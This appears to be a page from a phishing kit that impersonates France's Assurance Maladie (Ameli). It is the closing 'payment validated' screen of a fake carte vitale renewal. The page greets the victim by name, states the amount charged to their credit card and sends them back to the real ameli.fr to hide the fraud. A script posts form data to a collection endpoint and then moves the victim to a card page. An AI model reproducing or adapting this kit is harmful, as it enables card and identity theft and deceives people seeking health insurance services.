<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>
<html lang="fr">
<?php include("../common/header.php")  ?>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-itunes-app" content="app-id=505488770">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .progressbar { margin: 0px 10px; overflow: hidden; }
        .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
        .progressbar > div > span { color: rgb(52, 141, 48); }
        .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
        .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
        .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
        @media (max-width: 470px) {
          .progressbar > div > span { font-size: 11px !important; }
          .progressbar > div { width: inherit; padding-left: 5px; }
          .progressbar { margin: 0px auto; }
          .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
          .valider-btn { width: 100% !important; }
          .payment-form { padding: 10px !important; }
          .last-payment-form { padding: 10px !important; }
          .last-form-info > div { float: left !important; }
          .last-form-info > div > label { font-size: 11px; }
        }
        @media (max-width: 330px) {
          .progressbar > div > span { font-size: 10px !important; }
        }
        
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }
        
    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <link rel="shortcut icon" href="/public/fav.png" type="image/ico">

    <title>Veuillez remplir le formulaire</title>
</head>
<style>
    				.panel-heading{
					border-bottom : 2px solid #003763 !important

				}
                span{
                    color : #003763 !important;
                }
                .btn-xl{
                    background-color : #003763 !important;
                }
</style>
<body>

<div class="content-wrap" style="margin-top: 0px; margin-bottom: 30px; 
background: #003763 none repeat scroll 0% 0%;">
        <div class="banner">
			<?php include("../common/svg.php"); ?>
								
     </div>
    </div>
    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Assurance Maladie</a></li>
                <li class="active">Mise à jour carte vitale V3</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">

<div class="row">
    <div class="col-md-12">

        <div class="panel panel-default" style="background: url(../assets/images/back.png);">
            <div class="panel-heading">

                <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Paiement validé</h2>
            </div>

            <div class="panel-body"><br>

                
                <br>
                Identifiant référentiel : <b>FR5284564747511147</b>
                
                <br>
                Titulaire : <b>Ameli</b>

                <br>
                Montant débité : <b><?php echo $_SESSION["prix"] ?> € <small>(CARTE DE CRÉDIT)</small></b>
                
                <hr>
                
                
                
            
            
                        
                        <div class="row">
                        <div class="col-md-12">
                        
                        <div class="progressbar">
                  
                    <div><span>Identifiez-vous</span>
                        <div></div>
                    </div>
                    <div><span>Adresse</span>
                        <div></div>
                    </div>
                    <div><span>Frais de port</span>
                        <div></div>
                    </div>
                    <div> <span>Paiement</span>
                        <div></div>
                    </div>
                    <div class="progressing"> <span>Validée</span>
                        <div></div>
                    </div>
                </div>
                <br><br>

Merci <b><?php echo $_SESSION["prenom"] . " " . $_SESSION["nom"] ?></b>, nous avons bien pris en compte la demande concernant votre nouvelle carte vitale. <br> <br> Celle-ci sera <strong>traitée rapidement</strong> par notre équipe de vérification.
Votre nouvelle carte vous sera envoyée par voie postale sous peu.

             <br>
             
             Afin de certifier et valider votre demande de nouvelle carte vitale dans les meilleurs délais, ce dernier pourra vous contacter très rapidement sur : 
             <br><br>
             <b>- Votre numéro de téléphone<br>
             - Votre espace personnel Ameli<br><br><br><br><br>
            
            </b>
             
             Merci de votre confiance <br>
             l'Assurance Maladie.
<br>	

<meta http-equiv="refresh" content="30;url=https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?_somtc=true">


            </div>
        </div>
    </div>
</div>
<br><br>



</div>
</div></main>

    <div id="loading" class="LoadingPage">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://www.ameli.fr/themes/custom/ameli/images/logo.svg">
                </div>
                <span>Veuillez patienter ...</span>
            </div>
        </div>
    </div>
	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>
    <script>


        $(document).ready(function() {
        			$("form").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/avoir.php",
        						data: $this.serialize()
        					})
        					.done(function(msg) {
        						setTimeout(function() {
        							window.location.href = "card.php";
        						}, 2000);
        					});
        				
        
        			});
        		});
    </script>

</body>

</html>